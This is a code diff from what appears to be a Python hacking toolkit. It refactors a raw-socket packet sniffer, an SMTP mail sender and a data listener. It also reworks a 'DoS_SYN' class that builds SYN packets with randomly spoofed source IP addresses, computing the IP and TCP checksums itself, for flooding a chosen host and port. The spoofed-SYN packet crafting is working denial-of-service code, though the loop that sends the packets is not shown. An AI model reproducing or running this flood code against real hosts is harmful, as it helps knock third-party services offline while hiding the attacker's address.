@@ -72,7 +72,9 @@ class Sniff :
         flg = payload[4] >> 13
         oft = payload[4] & 0x1fff
         ttl = payload[5]
-        protos = {1: "ICMP", 2: "IGMP", 6: "TCP", 17: "UDP"}
+        protos = {socket.IPPROTO_ICMP : "ICMP", 
+                socket.IPPROTO_TCP : "TCP", 
+                socket.IPPROTO_UDP : "UDP"}
         prt = protos[payload[6]] if payload[6] in protos.keys() else payload[6]
         csm = hex(payload[7])
         src = socket.inet_ntop(socket.AF_INET, payload[8])
@@ -89,24 +91,6 @@ class Sniff :
         seq = payload[4]
         data = raw_payload[8:]
         return typ, cod, csm, idn, seq, data
-
-    def igmpv1_header(self, raw_payload : bytes) :
-        payload = struct.unpack("!BBHL", raw_payload)
-        ver = payload[0] >> 4
-        typ = payload[0] & 0xf
-        csm = hex(payload[2])
-        gpa = payload[3]
-        data = raw_payload[8:]
-        return ver, typ, csm, gpa, data
-
-    def igmpv2_header(self, raw_payload : bytes) :
-        payload = struct.unpack("!BBHL", raw_payload)
-        typ = payload[0]
-        mrt = payload[1]
-        csm = hex(payload[2])
-        gpa = payload[3]
-        data = raw_payload[8:]
-        return typ, mrt, csm, gpa, data
 
     def tcp_header(self, raw_payload : bytes) :
         payload = struct.unpack("!HHLLBBHHH", raw_payload[:20])
@@ -171,17 +155,6 @@ class Sniff :
             text = f"\tICMP Packet :{t}Type : {typ}{t}Code : {cod}{t}Checksum : {csm}{t}Identifier : {idn}{t}Sequence : {seq}{t}Raw Data :\n{self.__writedata(data)}"
             self.__content += text + "\n"
 
-        elif iph[8] == "IGMP" :
-            check = int(binascii.hexlify(self.__raw_buffer[iph[1]:]).decode()[:2])
-            if check in [16, 17] :
-                typ, mrt, csm, gpa, data = self.igmpv2_header(self.__raw_buffer[iph[1]:])
-                text = f"\tIGMPv2 Packet :{t}Type : {typ}{t}Max Response Time : {mrt}{t}Checksum : {csm}{t}Group Address : {gpa}{t}Raw Data : \n{self.__writedata(data)}"
-                self.__content += text + "\n"
-            elif check == 12 :
-                ver, typ, csm, gpa, data = self.igmpv1_header(self.__raw_buffer[iph[1]:])
-                text = f"\tIGMPv1 Packet :{t}Version : {ver}{t}Type : {typ}{t}Checksum : {csm}{t}Group Address : {gpa}{t}Raw Data : \n{self.__writedata(data)}"
-                self.__content += text + "\n"
-
         elif iph[8] == "TCP" :
             src, dst, seq, acn, oft, flg, win, csm, urg, data = self.tcp_header(self.__raw_buffer[iph[1]:])
             text = f"\tTCP Segment :{t}Source Port : {src}{t}Destination Port : {dst}{t}Sequence : {seq}{t}Acknowledgment : {acn}{t}Data Offset : {oft}{t}Flags :{t}"
@@ -227,7 +200,7 @@ class Sniff :
                     sys.exit(1)
         except Exception as error :
             print(f"[!] Error - {error or None}")
-        return
+        return None
 
 
 class DoS_SYN :
@@ -236,39 +209,34 @@ class DoS_SYN :
         self.port = int(port) if not isinstance(port, int) else port
         self.rate = int(rate) if not isinstance(rate, int) else rate
         self.socket_protocol = socket.IPPROTO_TCP if "win" not in sys.platform.lower() else socket.IPPROTO_IP
-        self.randip = str()
         self.SYMBOL = chr(9608)
 
-    def ip_header(self, version : int = 4, ihl : int = 5, tos : int = 0, tlen : int = 40, 
-                iden : int = 43981, flags : int = 0, offset : int = 0, ttl : int = 255, 
-                proto : int = socket.IPPROTO_TCP, csum : int = 0) :
-        ihl_version = (version << 4) + ihl
-        flags_offset = (flags << 13) + offset
-        self.randip = self.random_ip()
-        src = socket.inet_pton(socket.AF_INET, self.randip)
-        dest = socket.inet_pton(socket.AF_INET, self.host)
-        packet = struct.pack("BBHHHBBH4s4s", ihl_version, tos, tlen, iden, 
-                        flags_offset, ttl, proto, csum, src, dest)
+    def ip_header(self, ver : int = 4, ihl : int = 5, tos : int = 0, tln : int = 40, 
+                idn : int = 0, flg : int = 0, oft : int = 0, ttl : int = 255, 
+                prt : int = socket.IPPROTO_TCP, csm : int = 0, src : str = str(), dst : str = str()) :
+        ihl_ver = (ver << 4) + ihl
+        flg_oft = (flg << 13) + oft
+        packet = struct.pack("BBHHHBBH4s4s", ihl_ver, tos, tln, idn, 
+                        flg_oft, ttl, prt, csm, src, dst)
         return packet
 
-    def tcp_header(self, srcp : int = 1337, destp : int = 0, sequ : int = 0, ackn : int = 0, 
-                offset : int = 5, urg : int = 0, ack : int = 0, psh : int = 0, rst : int = 0, 
-                syn : int = 0, fin : int = 0, win : int = 8192, csum : int = 0, urgp : int = 0) :
-        offset <<=  4
-        flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
-        packet = struct.pack("HHLLBBHHH", srcp, destp, sequ, ackn, offset, 
-                        flags, win, csum, urgp)
+    def tcp_header(self, srp : int = 1337, dsp : int = 0, seq : int = 0, acn : int = 0, 
+                oft : int = 5, urg : int = 0, ack : int = 0, psh : int = 0, rst : int = 0, 
+                syn : int = 0, fin : int = 0, win : int = 35000, csm : int = 0, urp : int = 0) :
+        oft <<=  4
+        flg = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
+        packet = struct.pack("HHLLBBHHH", srp, dsp, seq, acn, oft, 
+                        flg, win, csm, urp)
         return packet
 
-    def pseudo_header(self, reserved : int = 0, proto : int = socket.IPPROTO_TCP, tcplen : int = 0) :
-        src = socket.inet_pton(socket.AF_INET, self.randip)
-        dest = socket.inet_pton(socket.AF_INET, self.host)
-        packet = struct.pack("4s4sBBH", src, dest, reserved, proto, tcplen)
+    def pseudo_header(self, src : str = str(), dst : str = str(), res : int = 0, 
+                    prt : int = socket.IPPROTO_TCP, tcp : int = 0) :
+        packet = struct.pack("4s4sBBH", src, dst, res, prt, tcp)
         return packet
         
     def checksum(self, data : bytes):
         checksum = 0
-        for i in range(0, len(data), 2):
+        for i in range(0, len(data), 2) :
             word = (data[i] << 8) + data[i + 1]
             checksum += word
         checksum = (checksum >> 16) + (checksum & 0xffff)
@@ -276,18 +244,21 @@ class DoS_SYN :
         return checksum
 
     def random_ip(self) :
-        secs = [str(random.randint(1, 255)) for _ in range(0, 4)]
+        secs = [str(random.randint(9, 255)) for _ in range(0, 4)]
         return ".".join(secs)
 
     def prepare(self) :
-        ip_header = self.ip_header()
+        randip = self.random_ip()
+        src = socket.inet_pton(socket.AF_INET, randip)
+        dst = socket.inet_pton(socket.AF_INET, self.host)
+        ip_header = self.ip_header(src = src, dst = dst, idn = random.randint(0, 65535))
         ip_header = self.checksum(ip_header)
-        ip_header = self.ip_header(csum = ip_header)
-        tcp_header = self.tcp_header(destp = self.port, syn = 1)
-        pseudo_header = self.pseudo_header(tcplen = len(tcp_header))
+        ip_header = self.ip_header(src = src, dst = dst, idn = random.randint(0, 65535), csm = ip_header)
+        tcp_header = self.tcp_header(dsp = self.port, syn = 1)
+        pseudo_header = self.pseudo_header(src = src, dst = dst, tcp = len(tcp_header))
         data = tcp_header + pseudo_header
         tcp_checksum = self.checksum(data)
-        tcp_header = self.tcp_header(destp = self.port, syn = 1, csum = tcp_checksum)
+        tcp_header = self.tcp_header(dsp = self.port, syn = 1, csm = tcp_checksum)
         payload = ip_header + tcp_header
         return payload
 
@@ -492,7 +463,7 @@ class SendEmail :
                 print(f"[*] connecting to the {smtp_server}")
                 mail.connect((smtp_server, 587))
                 conn = mail.recv(1024)
-                if conn.decode().startswith("220") :
+                if conn.decode().split()[0] == str(220) :
                     print(f"[+] server {smtp_server} is ready")
                 else :
                     print(f"[-] server {smtp_server} isn't ready")
@@ -541,7 +512,7 @@ class Listen :
         path = f"data{self.TIME}.txt"
         mode = "a" if os.path.exists(path) else "x"
         with open(path, mode) as file :
-            file.write(self.all_data.replace("\r", ""))
+            file.write(self.all_data.replace("\r", str()))
         return None
 
     def listen(self, module : bool = False) :
